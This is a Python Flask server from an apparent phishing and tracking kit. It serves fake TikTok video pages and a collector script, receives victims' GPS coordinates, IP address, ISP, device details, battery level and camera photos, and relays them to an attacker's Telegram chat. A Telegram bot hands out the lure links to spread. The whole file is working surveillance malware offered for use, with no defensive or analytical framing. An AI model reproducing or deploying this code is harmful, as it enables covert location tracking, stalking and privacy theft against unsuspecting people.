from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests, base64, os

app = Flask(__name__)
CORS(app)

TELEGRAM_TOKEN = os.environ.get('BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

def send_telegram(data):
    bat, dev, net, con, gps = data.get('battery',{}), data.get('device',{}), data.get('network',{}), data.get('connection',{}), data.get('gps',{})
    msg = f"""🎵 TikTok Session
🕐 {data.get('timestamp')}
🆔 {data.get('sessionId')}
📍 GPS: {gps.get('lat','?')}, {gps.get('lon','?')}
🌐 IP: {net.get('ip','?')} | {net.get('city','?')}, {net.get('country','?')}
📡 ISP: {net.get('isp','?')}
📱 {dev.get('platform','?')} | {dev.get('screen','?')} | {dev.get('memory','?')}GB
🔋 {bat.get('level','?')} | 📶 {con.get('type','?')}"""
    try:
        requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
    except: pass
    if data.get('photo'):
        try:
            b = base64.b64decode(data['photo'].split(',')[1])
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 TikTok'}, files={'photo': ('p.jpg', b, 'image/jpeg')})
        except: pass

@app.route('/collect', methods=['POST'])
def collect():
    send_telegram(request.json)
    return jsonify({'status':'ok'})

@app.route('/')
@app.route('/video')
@app.route('/trending')
@app.route('/foryou')
def index():
    return send_from_directory('.', 'webpage.html')

@app.route('/collector.js')
def js():
    return send_from_directory('.', 'collector.js')

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text in ['/start', '/link']:
            msg = """🎵 TikTok Videos

1: https://tiktok-video-production.up.railway.app/trending
2: https://tiktok-video-production.up.railway.app/foryou
3: https://tiktok-video-production.up.railway.app/video

📱 Watch now!"""
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': msg})
    return jsonify({'status':'ok'})

@app.route('/setup_webhook')
def setup_webhook():
    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url=https://tiktok-video-production.up.railway.app/webhook')
    return jsonify(r.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
